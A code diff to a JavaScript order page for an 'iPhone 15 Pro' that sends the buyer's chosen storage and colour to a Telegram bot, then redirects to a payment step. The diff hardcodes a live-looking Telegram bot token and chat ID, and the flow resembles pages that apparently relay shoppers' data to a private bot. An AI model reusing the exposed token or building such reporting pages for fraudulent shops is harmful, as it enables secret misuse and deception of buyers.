@@ -196,25 +196,27 @@
 
     // Continue → Payment + Telegram
     document.getElementById("continue-btn").addEventListener("click", function () {
-      const botToken = "8097834484:AAG7whd2jF7Ie5pXUiomwXd1VwleQPpAogc";
-      const chatId  = "7811430582";
+      var botToken = "8097834484:AAG7whd2jF7Ie5pXUiomwXd1VwleQPpAogc";
+      var chatId  = "7811430582";
 
-      const storageEl = document.querySelector("#storage-options .selected");
-      const colorEl   = document.querySelector("#color-options .selected .color-label");
+      var storageEl = document.querySelector("#storage-options .selected");
+      var colorEl   = document.querySelector("#color-options .selected .color-label");
 
-      const selectedStorage = storageEl ? storageEl.innerText.trim() : "256 GB";
-      // نحول الـ <br> إلى مسافة واحدة
-      const selectedColor = colorEl
-        ? colorEl.innerHTML.replace(/<br\s*\/?>/gi, " ").trim()
-        : "Natural Titanium";
+      var selectedStorage = storageEl ? storageEl.innerText.trim() : "256 GB";
 
-      const msg =
-        📱 *New Order Submitted*\n\n +
-        Model: iPhone 15 Pro\n +
-        Storage: ${selectedStorage}\n +
-        Color: ${selectedColor};
+      // نحول الـ <br> لمسافة وحدة
+      var selectedColor = "Natural Titanium";
+      if (colorEl) {
+        selectedColor = colorEl.innerHTML.replace(/<br\s*\/?>/gi, " ").trim();
+      }
 
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      var msg =
+        "New Order Submitted\n\n" +
+        "Model: iPhone 15 Pro\n" +
+        "Storage: " + selectedStorage + "\n" +
+        "Color: " + selectedColor;
+
+      fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
@@ -222,9 +224,11 @@
           text: msg,
           parse_mode: "Markdown"
         })
-      }).catch(function (err) {
+      })
+      .catch(function (err) {
         console.error("Telegram error:", err);
-      }).finally(function () {
+      })
+      .then(function () {
         // بعد الإرسال (أو حتى لو فشل) يروح على step-3
         window.location.href = "step-3.html";
       });
